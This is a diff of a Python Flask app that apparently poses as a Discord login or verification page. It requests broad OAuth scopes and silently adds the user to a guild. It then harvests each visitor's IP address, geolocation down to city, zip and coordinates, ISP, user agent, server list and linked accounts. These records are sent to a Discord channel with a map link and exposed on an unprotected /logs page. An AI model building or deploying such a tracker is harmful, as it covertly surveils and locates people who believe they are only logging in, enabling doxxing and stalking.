@@ -1,10 +1,8 @@
-# main.py
-
 from flask import Flask, request, render_template, redirect
 import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
-from discord_bot import bot  # あなたのdiscord_bot.pyにBot処理を実装済みとする
+from discord_bot import bot
 from user_agents import parse
 
 load_dotenv()
@@ -18,13 +16,13 @@ DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
-# --- IP取得 ---
+
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
 
-# --- IPジオロケーション ---
+
 def get_geo_info(ip):
     try:
         res = requests.get(
@@ -51,7 +49,7 @@ def get_geo_info(ip):
             "lat": None, "lon": None, "proxy": False, "hosting": False
         }
 
-# --- ログ保存 ---
+
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
@@ -66,19 +64,23 @@ def save_log(discord_id, data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-# --- ルート（ログインページ） ---
+
 @app.route("/")
 def index():
+    source_guild = request.args.get("source_guild", "不明")
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
         f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
+        f"&state={source_guild}"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
-# --- コールバック（OAuth2処理） ---
+
 @app.route("/callback")
 def callback():
     code = request.args.get("code")
+    source_guild = request.args.get("state", "不明")
+
     if not code:
         return "コードがありません", 400
 
@@ -103,13 +105,11 @@ def callback():
     if not access_token:
         return "アクセストークン取得失敗", 400
 
-    # ユーザー情報取得
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    # Botでサーバー参加
     requests.put(
         f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
         headers={
@@ -119,17 +119,18 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IP情報取得
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
 
-    # User-Agent解析
     ua_raw = request.headers.get("User-Agent", "不明")
     ua = parse(ua_raw)
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
+
+    bot_guild_ids = [DISCORD_GUILD_ID]
+    joined_guilds = [g["name"] for g in guilds if g["id"] in bot_guild_ids]
 
     data = {
         "username": user.get("username"),
@@ -161,11 +162,12 @@ def callback():
         "user_agent_bot": ua.is_bot,
         "guilds": guilds,
         "connections": connections,
+        "source_guild": source_guild,
+        "joined_guilds": joined_guilds
     }
 
     save_log(user["id"], data)
 
-    # Botへログ送信・役職付与など非同期処理
     try:
         embed_data = {
             "title": "✅ 新しいアクセスログ",
@@ -181,7 +183,8 @@ def callback():
                 f"**国:** {data['country']} / {data['region']} / {data['city']} / {data['zip']}\n"
                 f"**ISP:** {data['isp']} / AS: {data['as']}\n"
                 f"📍 [地図リンク](https://www.google.com/maps?q={data['lat']},{data['lon']})\n"
-                f"**サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}"
+                f"**認証元URL:** {data['source_guild']}\n"
+                f"**Botと共通のサーバー:** {', '.join(data['joined_guilds']) if data['joined_guilds'] else 'なし'}"
             ),
             "thumbnail": {"url": data["avatar_url"]},
             "fields": [
@@ -204,7 +207,7 @@ def callback():
 
     return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])
 
-# --- ログ一覧表示 ---
+
 @app.route("/logs")
 def show_logs():
     if os.path.exists(ACCESS_LOG_FILE):
@@ -214,8 +217,10 @@ def show_logs():
         logs = {}
     return render_template("logs.html", logs=logs)
 
+
 def run_bot():
     bot.run(DISCORD_BOT_TOKEN)
+
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
